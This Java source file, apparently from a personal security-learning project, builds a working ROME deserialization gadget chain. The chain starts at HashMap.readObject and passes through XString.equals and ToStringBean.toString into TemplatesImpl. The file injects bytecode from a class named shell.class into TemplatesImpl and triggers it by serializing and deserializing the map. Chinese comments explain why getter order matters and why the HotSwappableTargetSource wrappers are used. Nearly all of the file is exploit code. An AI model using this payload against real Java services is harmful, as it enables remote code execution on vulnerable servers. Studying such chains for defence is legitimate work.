import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;
import util.Util;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/14
 */
/*
* HashMap.readObject()
*   HashMap.putVal()
*      XString.equals()
*        ToStringBean.toString()
*           TemplatesImpl.getOutputProperties()
*
* */
    /*
    * 注意点！
    * 这个坑调了很久才发现，但是以后肯定也会遇到，
    * 在所有调用getter方法，这里就是ToStringBean的toString方法，它会调用我们传入参数TemplatesImpl对象的所有getter方法，
    * 但是这个执行顺序是不可控的，这取决于jvm，可能不同jdk就不同执行顺序，这就有一个大问题，在TemplatesImpl有个属性_sdom,如果先调用这个属性的getter
    * 即为getStylesheetDOM，而这个属性的默认值又是为null，而且这个属性是transient，也就是我们无法通过反射传入对象，所以就会提前报空指针异常，
    * 这也就导致有不确定性产生。
    * 说明：为什么使用HotSwappableTargetSource这个类作为包装类，这个类中hashcode方法是使用自身的class类作为参数进行计算，
    * 这样算出来的结果是相同的，在putVal需要比较先判断两个类的key的值hashcode是否相同才会调用equals方法
    *
    * */
public class ROME_HotSwappableTargetSource {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86133\\IdeaProjects\\JavaSec\\ROME\\target\\classes\\util\\shell.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates);
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("dragonkeep"));
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(h1,"dragonkeep1");
        hashMap.put(h2,"dragonkeep2");
        Util.serialize(hashMap);
        Util.unserialize();
    }
}
